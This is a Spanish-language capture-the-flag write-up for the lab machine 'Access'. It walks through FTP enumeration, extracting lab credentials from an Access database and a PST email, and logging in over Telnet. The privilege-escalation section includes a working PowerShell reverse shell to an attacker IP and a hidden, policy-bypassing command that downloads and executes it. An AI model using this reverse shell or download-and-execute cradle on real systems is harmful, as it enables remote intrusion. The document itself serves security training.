***
- Tags: #FTP #Telnet
****
Vamos a resolver la máquina Access
- Categoría: Fácil
- Sistema: Windows
- IP: `10.10.10.98`

### 1. Enumeración

Con el escaneo inicial de nmap obtenemos la siguiente información:

```nmap
# Nmap 7.95 scan initiated Mon Jul 14 12:56:28 2025 as: /usr/lib/nmap/nmap --privileged -p21,23,80 -sCV -oN targeted 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up (0.041s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 14 12:59:27 2025 -- 1 IP address (1 host up) scanned in 178.15 seconds
```

Intentamos hacer login anónimo por FTP, y vemos que se permite. Tras esto, vemos la siguiente información:

La descarga de los archivos fallaba tanto desde el cliente FTP como usando `wget` por una mala configuración del modo pasivo, por lo que se procedió a descargar los archivos de la siguiente manera:

```
wget --no-passive-ftp ftp://anonymous@10.10.10.98/Engineer/Access%20Control.zip

wget --no-passive-ftp ftp://anonymous@10.10.10.98/Backup/backup.mdb
```

### 2. Explotación

El archivo `.zip` está cifrado por contraseña que no conocemos, y no es descomprimible con `unzip`, si no con `7z`. Podemos listar su contenido de todas formas con `7z l 'Access Control.zip'`. Dado que no podemos descifrarlo por fuerza bruta con `rockyou.txt`, y tampoco pasarlo a un formato crackeable con `john`, pasamos a investigar el otro archivo, `backup.mdb`. Para ello, hacemos uso de `mdb-tools`:

```
mdb-tables backup.mdb
...SNIP...

auth_user 

...SNIP...
```

Hay muchísimas tablas, pero esa es la que nos interesa. Volcamos la información:

```bash
mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark 
25,"admin","admin",1,"08/23/18 21:11:47",26, 
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26, 
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Como vemos, tenemos la contraseña de `engineer`. La usamos para descifrar el `.zip`:

```
7z x -p'access4u@security' 'Access Control.zip'
```

Tras esto, se extrae el archivo `Access Control.pst`. Leamos su información con la herramienta correspondiente para este tipo de archivos:

```bash
1. sudo apt install pst-utils
2. mkdir output_pst
3. readpst o output_pst AccessControl.pst
```

> *Nota: Cambié el nombre del archivo .pst para eliminar el espacio por si hubiera algún problema*

Esto creará dentro de ese directorio el contenido extraído. Vemos que únicamente se crea un archivo `.mbox` que leemos, y se trata de un mail con información condifencial:

![[access1.png]]

Efectivamente, para el usuario `security` nos dan la contraseña `4Cc3ssC0ntr0ller`. La usamos para acceder por telnet:

```bash
telnet 10.10.10.98 23
login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================

C:\Users\security\Desktop>type user.txt
0eb8b78e6a3524854610ded3f5cc931c
```

### 3. Escalada de privilegios

La sesión de Telnet es una porquería. Por ello, creamos una reverse shell `.ps1` para mayor comodidad. Los pasos son estos:

1. Crear el `.ps1` malicioso:

```powershell
# shell.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.24",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

2. Ponernos en escucha por el puerto `4444` (con `nc -lvnp 4444`)
3. Servir el archivo con un servidor Python:

```bash
python3 -m http.server 8000
```

4. Descargar el `.ps1` malicioso en la sesión de Telnet abierta:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8000/shell.ps1')"
```

Y ya tenemos una sesión mejor. 
